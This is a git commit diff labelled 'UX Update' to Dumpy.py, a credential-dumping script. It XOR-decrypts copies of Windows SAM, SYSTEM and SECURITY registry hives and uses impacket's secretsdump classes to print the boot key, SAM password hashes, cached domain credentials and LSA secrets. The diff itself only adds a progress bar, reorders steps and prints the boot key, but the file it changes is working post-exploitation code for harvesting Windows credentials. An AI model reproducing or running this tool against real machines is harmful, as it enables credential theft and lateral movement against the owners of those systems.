8f09e84a7b0bd9ae4cf5b2bae06224351944d1d6
Wuentin <60709053+Wuentin@users.noreply.github.com>
2024-07-17 13:29:48 -0700

    UX Update

--- Dumpy.py
+++ Dumpy.py
@@ -2,18 +2,26 @@ import argparse
 import os
 from impacket.examples import secretsdump
 from impacket.examples.secretsdump import LocalOperations, SAMHashes, LSASecrets
+from tqdm import tqdm
+
 
 def xor_file(input_file, output_file, key):
     with open(input_file, 'rb') as f_in:
         with open(output_file, 'wb') as f_out:
             i = 0
-            while True:
-                chunk = f_in.read(4096)
-                if len(chunk) == 0:
-                    break
-                chunk = bytes([b ^ ord(key[i % len(key)]) for i, b in enumerate(chunk)])
-                f_out.write(chunk)
-                i += 1
+            file_size = os.path.getsize(input_file)
+            with tqdm(total=file_size, unit='B', unit_scale=True, desc=f'Decrypting {input_file}') as pbar:
+                while True:
+                    chunk = f_in.read(4096)
+                    if len(chunk) == 0:
+                        break
+                    chunk = bytes([b ^ ord(key[i % len(key)]) for i, b in enumerate(chunk)])
+                    f_out.write(chunk)
+                    pbar.update(len(chunk))
+                    i += 1
+                    
+    print()
+
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description='Decrypt SAM, SYSTEM, and SECURITY files using XOR operation and extract password hashes.')
@@ -32,9 +40,13 @@ if __name__ == "__main__":
     xor_file(args.system_file, 'HIVES/decrypted_SYSTEM', args.key)
     localOps = LocalOperations(systemHive='HIVES/decrypted_SYSTEM')
     bootKey = localOps.getBootKey()
+    
 
 
     xor_file(args.sam_file, 'HIVES/decrypted_SAM', args.key)
+    
+    xor_file(args.security_file, 'HIVES/decrypted_SECURITY', args.key)
+    print("Bootkey : " + bootKey.hex() + "\n")
     try:
         SAMHashesObj = SAMHashes('HIVES/decrypted_SAM', bootKey, isRemote=False)
         SAMHashesObj.dump()
@@ -44,13 +56,14 @@ if __name__ == "__main__":
         print('SAM hashes extraction failed: %s' % str(e))
 
    
-    xor_file(args.security_file, 'HIVES/decrypted_SECURITY', args.key)
+    
     try:
         LSASecretsObj = LSASecrets('HIVES/decrypted_SECURITY', bootKey, localOps, isRemote=False, history=False)
         LSASecretsObj.dumpCachedHashes()
         if args.output_file is not None:
             LSASecretsObj.exportCached(args.output_file)
         LSASecretsObj.dumpSecrets()
+        print()
         if args.output_file is not None:
             LSASecretsObj.exportSecrets(args.output_file)
     except Exception as e:
